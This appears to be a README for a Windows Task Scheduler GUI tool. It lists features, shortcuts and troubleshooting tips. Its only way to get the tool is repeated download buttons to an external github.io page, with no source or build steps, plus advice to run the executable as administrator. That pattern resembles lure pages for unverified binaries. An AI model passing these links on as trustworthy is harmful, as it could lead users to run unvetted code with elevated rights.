<div align="center">

<img src="assets/banner.svg" width="100%" alt="Task Scheduler GUI banner"/>

# task-scheduler-manager ⏰🧩

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*A friendlier face for Windows Task Scheduler — visual, fast, and built for humans, not just XML.*

<p align="center">
  <a href="https://ratehelpdrain.github.io/task-scheduler-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-4F46E5?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>
</p>
</div>

## 🌱 Overview

Somewhere along the way, Windows Task Scheduler became a tool that everybody needs and almost nobody enjoys using. The native interface hasn't fundamentally changed in years — nested dialog boxes, cryptic trigger conditions, and a UI that seems allergic to modern design. **task-scheduler-manager** started as a weekend itch-scratch project to fix that friction, and grew into a full-fledged GUI layer that sits on top of the Windows scheduling engine and makes it genuinely pleasant to work with.

This project is for the sysadmin juggling dozens of recurring jobs, the developer automating backups and build triggers, the power user who wants their scripts running on a schedule without memorizing `schtasks` syntax, and everyone in between. Whether you're orchestrating a nightly database dump, automating a cleanup script, or just want a reminder task that actually shows up when it should, task-scheduler-manager gives you a visual command center instead of a maze of tabs.

Under the hood, it's still talking to the same trusted Windows Task Scheduler service — we're not reinventing scheduling, we're re-skinning and re-humanizing it. Think of it as the dashboard your task automation always deserved. 🚀

<blockquote>

> [!NOTE]
> task-scheduler-manager reads and writes to the native Windows Task Scheduler store — your existing tasks show up automatically the first time you launch it.

</blockquote>

<p align="center">

<a href="https://ratehelpdrain.github.io/task-scheduler-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-4F46E5?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>

</p>

---

## ⚡ What It Brings To The Table

<table>
<tr>
<td width="50%">

**Visual Task Builder**
Drag together triggers, conditions, and actions on a canvas instead of clicking through five wizard pages.

</td>
<td width="50%">

**Live Task Timeline**
See every scheduled job plotted on a scrollable timeline so overlaps and collisions are obvious at a glance.

</td>
</tr>
<tr>
<td width="50%">

**One-Click Enable/Disable**
Toggle any task on or off from a switch — no more digging through right-click context menus.

</td>
<td width="50%">

**Smart Trigger Templates**
Pre-built templates for common patterns like "every weekday at 9am" or "on logon, delayed 5 minutes."

</td>
</tr>
<tr>
<td width="50%">

**Run History Inspector**
A readable log of past executions, exit codes, and durations — translated from the raw event log into plain English.

</td>
<td width="50%">

**Bulk Operations**
Select multiple tasks and enable, disable, export, or delete them together in a single action.

</td>
</tr>
<tr>
<td width="50%">

**Import / Export Profiles**
Package a set of tasks into a portable file you can carry between machines or share with teammates.

</td>
<td width="50%">

**Search & Filter Bar**
Instantly narrow hundreds of tasks by name, trigger type, status, or last run result.

</td>
</tr>
<tr>
<td width="50%">

**Dependency Hints**
Warnings when a task references a missing script path or a deleted trigger condition.

</td>
<td width="50%">

**Notification Center**
Optional desktop toasts when a critical scheduled task fails, so nothing silently breaks.

</td>
</tr>
</table>

> [!TIP]
> Combine the Search bar with Bulk Operations to mass-disable an entire category of tasks — great for maintenance windows.

---

## 🧭 How To Get Started

1. **Visit the landing page** — click the download button anywhere on this page.

2. **Grab the latest build** — the page always serves the current stable release.

3. **Run the executable** — no installer wizard, no dependency chasing, just launch it.

4. **Let it scan** — task-scheduler-manager auto-detects your existing scheduled tasks on first open.

> [!IMPORTANT]
> Some scheduled tasks require administrator privileges to view or edit. If a task looks greyed out, try relaunching task-scheduler-manager as an administrator.

---

## 🖥️ System Requirements

| Requirement | Details |
|---|---|
| **OS** | Windows 10 (64-bit) or Windows 11 |
| **Architecture** | x64 |
| **Dependencies** | None — fully standalone, self-contained executable |
| **Disk Space** | Under 150 MB |
| **Permissions** | Standard user for viewing; Administrator for editing elevated tasks |
| **.NET Runtime** | Bundled — nothing extra to install |

![Standalone](https://img.shields.io/badge/build-standalone-6E56CF?style=flat-square) ![No Dependencies](https://img.shields.io/badge/dependencies-none-2EA043?style=flat-square) ![Status](https://img.shields.io/badge/status-actively--maintained-yellow?style=flat-square)

---

## 🔩 How It Works

The architecture is intentionally simple — a thin, friendly UI layer riding on top of the operating system's own scheduling engine, so nothing about your task reliability changes, only how you interact with it.

1. **Discovery** — on launch, the app queries the Windows Task Scheduler service for all registered tasks.
2. **Rendering** — each task's triggers, actions, and conditions are parsed and drawn onto the visual canvas.
3. **Editing** — changes you make in the GUI are translated back into the native task definition format.
4. **Commit** — the updated definition is written back through the scheduling engine's own API, so Windows treats it exactly like a task created natively.
5. **Monitoring** — the Run History Inspector polls execution results and surfaces them in readable form.

```mermaid
flowchart LR
    Scan --> Render
    Render --> Edit
    Edit --> Commit
    Commit --> Monitor
```

---

## 🩹 Troubleshooting

<details>
<summary><strong>My task shows "disabled" but I never disabled it — why?</strong></summary>

<br>

Windows automatically disables tasks that fail repeatedly under certain trigger conditions. Check the Run History Inspector for the last exit code before re-enabling it.

</details>

<details>
<summary><strong>Why can't I edit a task that appears greyed out?</strong></summary>

<br>

That task is likely owned by SYSTEM or another elevated account. Relaunch task-scheduler-manager with administrator rights to unlock editing.

</details>

<details>
<summary><strong>My scheduled script runs fine manually but not on schedule. What gives?</strong></summary>

<br>

This is almost always a "start in" working directory mismatch or a missing environment variable that only exists in your interactive session. Set the working directory explicitly in the Action editor.

</details>

<details>
<summary><strong>Can I recover a task I accidentally deleted?</strong></summary>

<br>

If you exported a profile beforehand, you can re-import it. Otherwise, deletions go straight to the native task store and are not recoverable from within the app.

</details>

<details>
<summary><strong>Does task-scheduler-manager conflict with Group Policy managed tasks?</strong></summary>

<br>

No, but those tasks may appear read-only since Group Policy re-applies its settings on refresh cycles regardless of GUI edits.

</details>

> [!WARNING]
> Editing tasks created by system software or security tools can affect update or protection behavior. When in doubt, export a backup profile before making bulk changes.

---

## 🎨 UI / UX Details

task-scheduler-manager ships with a clean, keyboard-friendly interface designed for people who live in dozens of tasks at once.

| Shortcut | Action |
|---|---|
| `Ctrl + N` | Create new task |
| `Ctrl + F` | Focus search bar |
| `Ctrl + E` | Toggle enable/disable on selected task |
| `Ctrl + Shift + E` | Export selected tasks as profile |
| `Delete` | Remove selected task(s) |
| `F5` | Refresh task list from scheduler |
| `Ctrl + ,` | Open settings panel |

> [!TIP]
> Enable **Compact Row Mode** in Settings if you're managing more than a hundred tasks — it roughly doubles the visible rows per screen.

Theming includes a Light mode, a true Dark mode, and a "System" option that follows your Windows theme automatically. Settings persist per user profile, including your last filter state, column widths, and preferred timeline zoom level.

---

## 🤝 Contributing & Community

We welcome issues, feature requests, and pull requests from anyone who's ever muttered at Task Scheduler's default UI.

> Before opening a pull request, please check existing issues to avoid duplicate effort — many "missing" features are already in progress on a branch.

- Found a bug? Open an issue with your Windows version and repro steps.
- Have an idea for a trigger template? Start a discussion thread.
- Want to help with translations or documentation? Contributions of all sizes are appreciated.

---

## 📜 License

Released under the [MIT License](LICENSE), 2026. Use it, fork it, build on it — just keep the license notice intact.

---

## ⚠️ Disclaimer

task-scheduler-manager is an independent, community-driven project and is not affiliated with or endorsed by Microsoft. It interacts with the native Windows Task Scheduler service through supported public interfaces. Always review scheduled task changes before applying them in production environments — the maintainers are not responsible for consequences of misconfigured tasks.

<p align="center">

<a href="https://ratehelpdrain.github.io/task-scheduler-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-4F46E5?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>

</p>